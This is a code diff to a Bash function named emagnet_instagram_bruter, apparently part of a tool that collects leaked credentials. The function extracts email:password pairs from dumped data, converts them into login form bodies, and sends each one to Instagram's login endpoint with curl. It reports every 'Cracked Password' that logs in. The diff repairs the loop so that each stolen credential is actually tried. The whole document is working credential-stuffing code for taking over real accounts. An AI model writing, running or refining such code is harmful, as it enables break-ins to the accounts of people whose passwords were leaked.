@@ -720,20 +720,22 @@ blocked() {
 }
 
 emagnet_instagram_bruter() {
+emagnet_conf
 URL="https://www.instagram.com/accounts/login/ajax/"
 HEADER1="sec-fetch-site: same-origin"
 TOKEN="$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '')"
-grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<' >  /tmp/.emagnet-instagram-targets.txt 
+TARGETS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'| \
+cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|\
+sed 's/^/username=/g'|sed 's/:/\&password=/g' > /tmp/.emagnet-instagram-targets.txt)
 
 	while read line; do
-		curl -s $URL -H "$HEADER1" --data "$TARGETS" -H "x-csrftoken: $TOKEN" |grep -q 'authenticated": false'
+		curl -s $URL -H "$HEADER1" --data "$line" -H "x-csrftoken: $TOKEN" |grep -q 'authenticated": false'
 			if [[ "$?" -ne "0" ]]; then
-  			   echo -e "[\e[1;32m>>\e[0m] - Correct password for $USER: $PASSWORD"
+  			   echo -e "[\e[1;32m>>\e[0m] - Cracked Password: $(echo $line|awk -F'=' '{print $2,$3}'|sed 's/&password//g'|sed 's/ /:/g')"
 			else
-  			   echo -e "[\e[1;31m<<\e[0m] - Wrong password for $USER: $PASSWORD"
+  			   echo -e "[\e[1;31m<<\e[0m] - Wrong Password: $(echo $line|awk -F'=' '{print $2,$3}'|sed 's/&password//g'|sed 's/ /:/g')"
 			fi
 	done < /tmp/.emagnet-instagram-targets.txt
-
 rm /tmp/.emagnet-instagram-targets.txt &> /dev/null
 }
 
